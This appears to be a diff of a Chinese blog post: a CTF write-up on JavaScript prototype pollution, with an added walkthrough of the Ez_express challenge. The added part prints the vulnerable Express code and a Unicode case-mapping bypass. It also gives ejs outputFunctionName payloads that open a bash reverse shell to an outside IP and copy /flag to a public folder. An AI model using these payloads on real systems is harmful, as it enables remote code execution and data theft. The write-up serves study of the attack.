@@ -6,7 +6,7 @@
     <content><![CDATA[<p>通过几道ctf题学习javascript 原型链污染 </p>
 <a id="more"></a>
 
-<h2 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h2><p>javascript原型链污染，网上介绍原理的文章已经很多了，最经典的还是P神分析的那篇<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">文章</a>，这里就不在详细的介绍原理了，简单来说，就是</p>
+<h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><p>javascript原型链污染，网上介绍原理的文章已经很多了，最经典的还是P神分析的那篇<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">文章</a>，这里就不在详细的介绍原理了，简单来说，就是</p>
 <blockquote>
 <p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
 </blockquote>
@@ -25,7 +25,8 @@
 <p>在get路由中<code>dataList[0].count &gt; 5</code>时，会进行merge,如果我们可以控制raws[i].dom，我们就可以进行原型链污染，审计源码可以知道raws[i].dom为我们在add路由中输入的数据，那么我们就可以进行原型链污染，然后我们去找可以污染的对象，一般如果看到形如</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(aaaaa.xxxx)</span><br><span class="line">&#123;</span><br><span class="line">		..........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>这样的就可以通过原型链污染来进行进一步的利用。题目给的源码中我们可以看见有一个rebot.py，并且其中</p>
+<p>这样的就可以通过原型链污染来进行进一步的利用。</p>
+<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>题目给的源码中我们可以看见有一个rebot.py，并且其中</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chrome_options.add_argument(<span class="string">'--disable-xss-auditor'</span>)</span><br></pre></td></tr></table></figure>
 
 <p>那么，xss一定是出题人留的一条利用链，从rebot.py可以看到，密码就是flag，bot是直接访问的127.0.0.1，然后从响应中提取用户名和密码的输入框，然后输入用户名和密码，登录。这里看上去我们是没办法利用的，但是分析我们可以通过原型链污染来bypass。在前端的代码中，用了3.3.0版本的jquery，jquery的$.extend方法也存在原型链污染漏洞，</p>
@@ -59,7 +60,8 @@
 
 <p>然后发送payload，等待bot点击，去vps收flag。</p>
 <p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225154218671.png" alt="image-20200225154218671"></p>
-<p>以上是前端加后端的做法，这道题还有一种后端sys模板rce的方法，由于模板引擎存在变量拼接的过程，所以存在RCE的可能，然后我们跟进res.render()函数去分析，到response.js的render函数</p>
+<p>以上是前端加后端的做法。</p>
+<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>这道题还有一种后端sys模板rce的方法，由于模板引擎存在变量拼接的过程，所以存在RCE的可能，然后我们跟进res.render()函数去分析，到response.js的render函数</p>
 <p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225175640508.png" alt="image-20200225175640508"></p>
 <p>一些merge之后，调用然后跟到app.render()函数，继续跟进</p>
 <p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225175813279.png" alt="image-20200225175813279"></p>
@@ -117,6 +119,44 @@
 
 <p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225195631671.png" alt="image-20200225195631671"></p>
 <p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225195717892.png" alt="image-20200225195717892"></p>
+<h3 id="ichunqiu-新春公益赛-Ez-express"><a href="#ichunqiu-新春公益赛-Ez-express" class="headerlink" title="ichunqiu 新春公益赛 Ez_express"></a>ichunqiu 新春公益赛 Ez_express</h3><p>这道题目也给了源码，有下面几个路由：</p>
+<ul>
+<li>/   ：如果没登录会跳转到/login</li>
+<li>/login  <ul>
+<li>get  无特殊功能</li>
+<li>post  若submit为register为注册，若submit为login为登录。</li>
+</ul>
+</li>
+<li>/action : 只有admin可以用</li>
+<li>/info  ：无特殊功能</li>
+</ul>
+<p>接下来审计源码，先看routes/index.js</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.session.user)&#123;</span><br><span class="line">    res.redirect(<span class="string">'/login'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=<span class="literal">undefined</span>;</span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'login'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">"register"</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">'user'</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">'passwd'</span>: req.body.pwd,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">'/'</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">"login"</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;"</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(<span class="string">'/'</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">"ADMIN"</span>)&#123;res.end(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  <span class="comment">//console.log(req.session.user.data)</span></span><br><span class="line">  <span class="comment">//console.log(res.outputFunctionName)</span></span><br><span class="line">  res.end(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">'/info'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在注册的时候，safeKeyword()函数会检测禁止注册userid为admin(包括大小写)，如果通过safeKeyword()函数验证，就用toUpperCase()函数将输入的userid变成大写，赋值给session。</p>
+<p>然后再<code>/action</code>路由中通过比较req.session.user.user!=”ADMIN”来判断用户是否是admin。</p>
+<p>这里我们可以参考P神之前发的一篇关于javascript的大小写的小特性的<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">文章</a>，利用其中特性来绕过。</p>
+<blockquote>
+<p>这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p>
+<p>这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’.</p>
+</blockquote>
+<p>绕过这里之后，我们可以看到/action中调用了clone()函数，clone()又调用了merge()函数，这里就可以发生原型链污染。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们在本地测试一下，这里是否可以进行原型链污染，</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225215922481.png" alt="image-20200225215922481"></p>
+<p>结果是可以的，然后可以看到这里用的也是ejs的渲染引擎，然后我们继续污染outputFunctionName，来RCE。</p>
+<p>paylaod</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/174.0.197.203/8888 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225220249254.png" alt="image-20200225220249254"></p>
+<p>然后访问一下网页触发render()函数。在vps上收flag.</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/E:%5Cpaper%5Csource%5C_posts%5C%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%5Cimage-20200225220420908.png" alt="image-20200225220420908"></p>
+<p>另外也可以把flag读到读到public文件夹，</p>
+<p>payload</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"cat /flag&gt; /app/public/flag\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问flag，即可下载。</p>
 <p>参考：</p>
 <p><a href="https://www.xmsec.cc/prototype-pollution-notes/" target="_blank" rel="noopener">https://www.xmsec.cc/prototype-pollution-notes/</a></p>
 <p><a href="https://xz.aliyun.com/t/6113" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113</a></p>
